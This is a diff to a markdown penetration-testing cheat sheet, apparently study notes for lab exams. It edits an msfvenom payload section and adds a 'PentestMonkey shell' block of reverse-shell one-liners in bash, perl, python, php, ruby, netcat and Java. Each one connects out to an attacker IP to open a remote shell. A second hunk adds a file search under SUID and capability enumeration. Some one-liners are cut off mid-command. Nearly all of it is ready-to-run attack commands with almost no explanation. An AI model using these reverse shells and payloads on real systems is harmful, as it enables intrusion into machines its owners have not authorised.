@@ -1692,13 +1692,12 @@ msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
 msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
-
 # Between string is bad character, no need to mention - for LHOST and LPORT
 #reference is kevin PGPractice - https://www.youtube.com/watch?v=9h8BSFsL7wk
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.227 LPORT=80 -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -e x86/alpha_mixed
 ```
 
-### One Liners
+### One Liners shell
 - From [RevShells](https://www.revshells.com/)
 ```powershell
 sh -i >& /dev/tcp/192.168.45.220/4455 0>&1 
@@ -1706,6 +1705,25 @@ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 <?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/443 0>&1');?>
 #For powershell use the encrypted tool that's in Tools folder
+```
+### PentestMonkey shell
+- PentestMonkey Reverse Shell Cheatsheet [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+```powershell
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1    # bash
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S  #Perl
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));  # Python
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");' #php
+"php -r '\$sock=fsockopen(\"192.168.45.248\", 8443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"  # PHP encoding strings
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' #Ruby
+nc -e /bin/sh 10.0.0.1 1234   # Netcat
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f   # NC
+#Java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+#Java
+
+
 ```
 
 <aside>
@@ -2494,6 +2512,9 @@ find / -perm -g=s -type f 2>/dev/null
 find / -perm 4000 -type d 2>/dev/null
 find / -perm -1000 -type d 2>/dev/null
 getcap -r / 2>/dev/null
+
+# Search file
+find / -name local.txt 2>/dev/null
 ```
 
 ## Cron Jobs
